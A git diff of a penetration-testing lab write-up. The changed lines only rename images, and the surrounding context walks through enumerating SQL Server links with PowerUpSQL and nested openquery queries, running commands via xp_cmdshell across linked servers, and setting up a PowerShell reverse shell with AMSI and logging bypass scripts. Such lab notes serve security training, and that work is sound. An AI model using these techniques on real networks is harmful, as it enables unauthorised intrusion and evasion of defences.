@@ -19,7 +19,7 @@ Import-Module C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>
 
 So, we can connect to dcorp-mssql.
 
@@ -29,19 +29,19 @@ So, we can connect to dcorp-mssql.
 
 Using HeidiSQL client, let’s login to dcorp-mssql using windows authentication of studentx.
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 After login, enumerate linked databases on dcorp-mssql:
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 select * from master..sysservers
 ```
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 So, there is a database link to dcorp-sql1 from dcorp-mssql.
 
@@ -53,7 +53,7 @@ Let’s enumerate further links from dcorp-sql1. This can be done with the help 
 select * from openquery("DCORP-SQL1",'select * from master..sysservers')
 ```
 
-<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 It is possible to nest openquery within another openquery which leads us to dcorp-mgmt:
 
@@ -63,7 +63,7 @@ It is possible to nest openquery within another openquery which leads us to dcor
 select * from openquery("DCORP-SQL1",'select * from openquery("DCORP-MGMT",''select * from master..sysservers'')')
 ```
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can also use `Get-SQLServerLinkCrawl` for crawling the database links automatically:
 
@@ -73,9 +73,9 @@ We can also use `Get-SQLServerLinkCrawl` for crawling the database links automat
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! We have sysadmin on eu-sqlx server!
 
@@ -97,7 +97,7 @@ To avoid dealing with a large number of quotes and escapes, we can use the follo
 Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local  -Query "exec master..xp_cmdshell 'set username'"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nice! Thi goes as far as the EU-SQL so... I prepare the RS
 
@@ -123,22 +123,22 @@ Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xp_cmdshell ''
 >
 > Remember to start the web server WITH (Invoke-PowerShellTcpEx.ps1, Amsi-Byp.txt, sbloggingbypass.txt)
 >
-> <img src="../../../.gitbook/assets/image (32).png" alt="" data-size="original">
+> <img src="../../../.gitbook/assets/image (32) (1).png" alt="" data-size="original">
 
 > In the Invoke-PowerShellTcpEx.ps1 edit and put you IP
 
-<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (34) (1).png" alt=""><figcaption></figcaption></figure>
 
 Execute all and On the listener:
 
-<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (35) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 $env:username
 $env:computername
 ```
 
-<figure><img src="../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (36) (1).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
